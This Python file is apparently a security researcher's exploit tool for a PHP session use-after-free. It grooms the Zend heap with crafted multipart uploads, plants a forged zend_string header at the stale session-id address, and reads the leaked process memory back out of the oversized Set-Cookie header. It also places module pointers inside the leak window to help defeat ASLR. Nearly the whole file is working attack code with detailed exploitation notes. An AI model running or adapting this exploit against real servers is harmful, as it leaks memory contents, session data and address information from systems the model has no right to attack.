#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""b1_forge.py - rebuild the freed chunk with a forged zend_string at the stale id address.

Mechanism (read from the reference builder, reimplemented here): a request that OOMs leaves
`PS(id)` pointing into a freed 2 MiB Zend MM chunk. A later request that allocates a full-chunk
value gets a chunk back - and if that value carries a crafted `zend_string` header *at the offset
the stale pointer holds*, then `php_session_send_cookie` URL-encodes whatever length that header
claims, straight out of process memory.

The offset is the calibration: the stale pointer is at `chunk_base + off`, and a value's data
starts at `chunk_base + 0x1018` (0x1000 allocation header + 0x18 run header), so the forged header
must sit at `off - 0x1018` inside the value. The reference hard-codes a page-aligned id
(`A:0x137`); ours is not page-aligned, which is why this tool takes the offset as a parameter
instead of a page index.

usage:
  # 1. calibrate: read PS(id), compute off = PS(id) - (PS(id) & ~0x1FFFFF)
  b1_forge.py --send --off 0x540c0 --fake-len 0xC8000 --fields 3
"""
import argparse
import os
import socket
import struct
import sys

BOUNDARY = b"C" * 10
CHUNK = 0x200000          # Zend MM chunk on this build (2 MiB)
VALUE_DATA = 0x1000       # zend_mm_alloc_pages returns ZEND_MM_PAGE_ADDR(chunk, page): the run
                          # starts on a page boundary, so a value in a fresh/cached chunk begins
                          # at chunk + 0x1000 and its first data byte sits right there.


def header_offsets(off, total_len, stride):
    """Where inside the value the forged header goes.

    The value's data starts at chunk + VALUE_DATA, so a header that must sit at chunk + off goes
    to value offset off - VALUE_DATA. With a stride, the same header is repeated every `stride`
    bytes starting from that offset modulo the stride: the stale pointer's offset inside its chunk
    moves by whole pages between runs, so a single placement only lands when the page is guessed
    right.
    """
    base = off - VALUE_DATA
    if stride <= 0:
        return [base] if 0 <= base and base + 0x20 <= total_len else []
    phase = base % stride
    return [p for p in range(phase, total_len - 0x20 + 1, stride)]


def value_with_header(total_len, hdr_offs, fake_len, data_head=b"/99BBBBB", fill=b"A"):
    v = bytearray(fill * total_len)
    for hdr_off in hdr_offs:
        if hdr_off < 0 or hdr_off + 0x20 > total_len:
            continue
        struct.pack_into("<I", v, hdr_off + 0x00, 0)          # refcount 0 -> no free attempt
        struct.pack_into("<I", v, hdr_off + 0x04, 0x16)       # IS_STRING | GC_NOT_COLLECTABLE
        struct.pack_into("<Q", v, hdr_off + 0x08, 0)          # h
        struct.pack_into("<Q", v, hdr_off + 0x10, fake_len)   # len the encode will trust
        v[hdr_off + 0x18:hdr_off + 0x18 + len(data_head)] = data_head
    return bytes(v)


HEADER_IN_VALUE = 0x1018  # a large value's data starts 0x18 into its page-aligned run


def tag8(idx):
    """Per-part data head: the leaked prefix then names the part that got the id chunk."""
    return b"/%02dBBBBB" % (idx % 100)


def spec_value(item, fake_len, data_head, page_default):
    """One spec item -> (value bytes, forged header offset inside the value).

    Same vocabulary as the reference builder, so a spec can be copied verbatim:
      F:<pages>       plain fill of pages 1..pages ('A')
      S:<pages>       plain fill ('S')
      A:<page>        forged value that ends right after the fake header, so the claimed length
                      reads whatever the chunk still holds beyond it
      G:<pages>:<p>   fill pages 1..pages and forge the header at page <p> (frees the tail when
                      <pages> < 511 without moving the header)
    """
    kind, _, arg = item.partition(":")
    if kind in ("F", "S"):
        return (b"A" if kind == "F" else b"S") * (int(arg, 0) * 4096 - 25), None
    if kind == "G":
        pages_s, _, page_s = arg.partition(":")
        total = int(pages_s, 0) * 4096 - 25
        hdr = int(page_s, 0) * 0x1000 - HEADER_IN_VALUE
    elif kind == "A":
        hdr = int(arg, 0) * 0x1000 - HEADER_IN_VALUE
        total = hdr + 0x18 + len(data_head)
    else:
        raise SystemExit("unknown spec item %r" % item)
    if hdr < 0 or hdr + 0x18 + len(data_head) > total:
        raise SystemExit("spec item %r does not contain its header" % item)
    return value_with_header(total, [hdr], fake_len, data_head=data_head), hdr


def build(values, off, fake_len, fill_pages, name_len, sid, progress_first,
          data_head=b"/99BBBBB", prefix_count=0, prefix_pages=501, hdr_stride=0,
          tail_vars=900, value_len=0, tail_files=0,
          vars_after_first=0, spec="", page_default=0x137, tag=False):
    out = bytearray()

    def part(name, value, filename=None):
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid.encode())
    if progress_first:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 200)

    if spec:
        index = 0
        for raw in spec.replace(",", " ").split():
            body, _, mult = raw.partition("*")
            count = int(mult) if mult else 1
            if body.partition(":")[0] == "X":
                for _ in range(int(body.partition(":")[2], 0)):
                    part(("x%04d" % index).encode() + b"[a]" * 12, b"v")
                    index += 1
                continue
            for _ in range(count):
                head = tag8(index) if tag else data_head
                value, _ = spec_value(body, fake_len, head, page_default)
                part(("f%04d" % index).encode().ljust(name_len, b"f")[:name_len], value)
                index += 1
        out.extend(b"--" + BOUNDARY + b"--\r\n")
        return bytes(out), []

    # Cache-warming prefix: plain full-chunk fills. Each one takes a whole chunk (from the chunk
    # list or from heap->cached_chunks), so repeated fills walk through every chunk the process
    # holds - which is how one of them eventually lands on the chunk holding the stale pointer.
    for i in range(prefix_count):
        part(("p%03d" % i).encode().ljust(name_len, b"p")[:name_len],
             b"P" * (prefix_pages * 4096 - 50))

    total = value_len if value_len else fill_pages * 4096 - 50
    # Zend picks _emalloc_huge() above ZEND_MM_MAX_LARGE_SIZE (chunk - one page = 0x1FF000), and a
    # huge allocation always gets a fresh chunk at a new address - which is exactly what must not
    # happen. A multipart value becomes a zend_string, so 24 (header) + 1 (NUL) bytes are added to
    # the value length; -50 keeps the string one page below that limit.
    if 24 + total + 1 > CHUNK - 0x1000:
        print("WARNING: value of %d B becomes a huge allocation (limit %#x)"
              % (24 + total + 1, CHUNK - 0x1000))
    hdr_offs = header_offsets(off, total, hdr_stride)
    value = value_with_header(total, hdr_offs, fake_len, data_head=data_head)
    for i in range(values):
        if i == 1:
            # Nested array fields right after the first (forged) value: their HashTables carry
            # pDestructor = zval_ptr_dtor, so they put module pointers into the pages the leak window
            # covers instead of another 'A' fill.
            for j in range(vars_after_first):
                part(("y%04d" % j).encode() + b"[a]" * 12, b"w")
        part(("g%03d" % i).encode().ljust(name_len, b"g")[:name_len], value)
    if values <= 1:
        for j in range(vars_after_first):
            part(("y%04d" % j).encode() + b"[a]" * 12, b"w")
    for i in range(tail_vars):
        part(("x%04d" % i).encode() + b"[a]" * 12, b"v")
    # File parts after the forged values, before the progress field: they populate $_FILES in the
    # chunk tail right after the values, and their arrays use interned keys plus zval_ptr_dtor as the
    # destructor - module pointers inside the window. They must precede the progress field, because a
    # FILE_START with progress->key already set is what switches send_cookie off.
    for i in range(tail_files):
        part(b"fl%03d" % i, b"F" * 16, filename=b"x.txt")
    if not progress_first:
        part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 200)
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out), hdr_offs


def send(host, port, body, timeout=120.0, chunked=False):
    if chunked:
        head = ("POST / HTTP/1.1\r\nHost: %s\r\n"
                "Content-Type: multipart/form-data; boundary=%s\r\n"
                "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
                % (host, BOUNDARY.decode())).encode()
    else:
        # Content-Length keeps PHP reading the body in SAPI-sized pieces. A chunked body goes
        # through the dechunk filter, which buffers it in the request heap - and that buffering is
        # what consumes the low pages of the stale chunk before our value is allocated.
        head = ("POST / HTTP/1.1\r\nHost: %s\r\n"
                "Content-Type: multipart/form-data; boundary=%s\r\n"
                "Content-Length: %d\r\nConnection: close\r\n\r\n"
                % (host, BOUNDARY.decode(), len(body))).encode()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        return b"", "no target on %s:%d (%s)" % (host, port, exc.strerror or exc)
    sock.settimeout(timeout)
    err = None
    try:
        sock.sendall(head)
        if chunked:
            for o in range(0, len(body), 65536):
                piece = body[o:o + 65536]
                sock.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
            sock.sendall(b"0\r\n\r\n")
        else:
            sock.sendall(body)
    except OSError as exc:
        err = repr(exc)
    raw = b""
    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            raw += data
    except OSError as exc:
        err = err or repr(exc)
    sock.close()
    return raw, err


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8130/")
    ap.add_argument("--off", default="0x540c0",
                    help="offset of the stale PS(id) pointer inside its 2 MiB chunk")
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0xC8000)
    ap.add_argument("--values", type=int, default=4,
                    help="full-chunk forged values; each one takes a whole chunk, so N of them "
                         "walk through N chunks")
    ap.add_argument("--tail-vars", type=int, default=900,
                    help="small trailing variables (the reference's X:900 filler)")
    ap.add_argument("--fill-pages", type=int, default=511)
    ap.add_argument("--vars-after-first", type=int, default=0,
                    help="nested array fields inserted right after the first forged value, so their "
                         "HashTables (pDestructor = zval_ptr_dtor) land in the pages the leak window "
                         "covers instead of a second A fill")
    ap.add_argument("--tail-files", type=int, default=0,
                    help="file parts appended after the values and before the progress field: their "
                         "$_FILES arrays carry interned keys and zval_ptr_dtor, i.e. module pointers "
                         "inside the leak window")
    ap.add_argument("--value-len", type=lambda x: int(x, 0), default=0,
                    help="exact byte length of the forged value; the reference ends the value "
                         "right after the fake data head, so the claimed length reads the next "
                         "allocation instead of our own filler")
    ap.add_argument("--name-len", type=int, default=120)
    ap.add_argument("--sid", default="a")
    ap.add_argument("--progress-first", action="store_true")
    ap.add_argument("--data-head", default="/99BBBBB",
                    help="first bytes of the forged string's data; '/' makes php_session_valid_key "
                         "fail (the reference's choice), valid id characters let it pass")
    ap.add_argument("--marker", default="",
                    help="hex marker placed as the forged data head and printed back, so "
                         "gdb/find_forge.py can look for exactly this value")
    ap.add_argument("--prefix-count", type=int, default=2,
                    help="full-chunk fills sent before the forged one (cache warming)")
    ap.add_argument("--prefix-pages", type=int, default=501)
    ap.add_argument("--hdr-stride", type=lambda x: int(x, 0), default=0,
                    help="repeat the forged header every N bytes (0x1000 makes the placement "
                         "independent of which page the stale pointer lands on)")
    ap.add_argument("--chunked", action="store_true",
                    help="send the body chunked (default: Content-Length, which avoids the "
                         "dechunk filter buffering the whole body in the request heap)")
    ap.add_argument("--spec", default="",
                    help="reference-style field list instead of --values/--fill-pages/--tail-vars, "
                         "e.g. 'G:511:0x137*14,G:400:0x137,G:511:0x137,X:900'")
    ap.add_argument("--out", default="",
                    help="also write the request body here (byte-for-byte comparison)")
    ap.add_argument("--no-send", action="store_true",
                    help="build the body and stop (used to diff against the reference builder)")
    ap.add_argument("--save-cookie", default="",
                    help="write the raw Set-Cookie value here for the leak decoder")
    ap.add_argument("--tag", action="store_true",
                    help="give every spec value its own data head ('/<idx>BBBBB') so the leaked "
                         "prefix names the part that landed on the stale id")
    args = ap.parse_args()

    if args.marker:
        marker = bytes.fromhex(args.marker)
        data_head = marker
    else:
        # Random per run so a stale value from an earlier request cannot be mistaken for this
        # one; the leading '/' keeps php_session_valid_key failing whatever the rest is.
        marker = b"/" + os.urandom(15)
        data_head = marker
    print("MARKER=%s" % marker.hex())

    hostport = args.url.split("://", 1)[-1].split("/")[0]
    host, _, port = hostport.partition(":")
    port = int(port or 80)
    off = int(args.off, 0)

    body, hdr_offs = build(args.values, off, args.fake_len, args.fill_pages, args.name_len,
                           args.sid, args.progress_first, data_head,
                           prefix_count=args.prefix_count, prefix_pages=args.prefix_pages,
                           hdr_stride=args.hdr_stride, tail_vars=args.tail_vars,
                           value_len=args.value_len, tail_files=args.tail_files,
                           vars_after_first=args.vars_after_first, spec=args.spec, tag=args.tag)
    if args.out:
        with open(args.out, "wb") as fh:
            fh.write(body)
    print("body=%d B  off=%#x  hdr_off_in_value=%s  fake_len=%#x"
          % (len(body), off,
             args.spec or
             (("%#x x%d (stride %#x)" % (hdr_offs[0], len(hdr_offs), args.hdr_stride))
              if len(hdr_offs) > 1 else (", ".join("%#x" % h for h in hdr_offs) or "none")),
             args.fake_len))
    if args.no_send:
        return 0
    raw, err = send(host, port, body, chunked=args.chunked)
    if (err or "").startswith("no target on"):
        print(err, file=sys.stderr)
        return 3
    text = raw.decode("latin1", "replace")
    head = text.partition("\r\n\r\n")[0]
    lines = head.splitlines()
    print("response: %s (%d bytes)%s" % (lines[0] if lines else "(none)", len(raw),
                                         "  [socket %s]" % err if err else ""))
    leaked = False
    for ln in lines:
        if ln.lower().startswith("set-cookie"):
            value = ln.split("=", 1)[-1].split(";")[0]
            print("Set-Cookie: %d chars" % len(value))
            leaked = len(value) > 4096
            print("preview   : %s" % value[:100])
            if args.save_cookie:
                with open(args.save_cookie, "w", encoding="latin1") as fh:
                    fh.write(value)
    if not any(ln.lower().startswith("set-cookie") for ln in lines):
        print("(no Set-Cookie)")
    resp_body = text.partition("\r\n\r\n")[2].strip()
    if resp_body:
        print("body      : %s" % resp_body.replace("\n", " ")[:600])
    print("VERDICT   :", "COOKIE CARRIES A LARGE BLOB - leak path reached" if leaked
          else "no oversized cookie")
    return 0


if __name__ == "__main__":
    sys.exit(main())
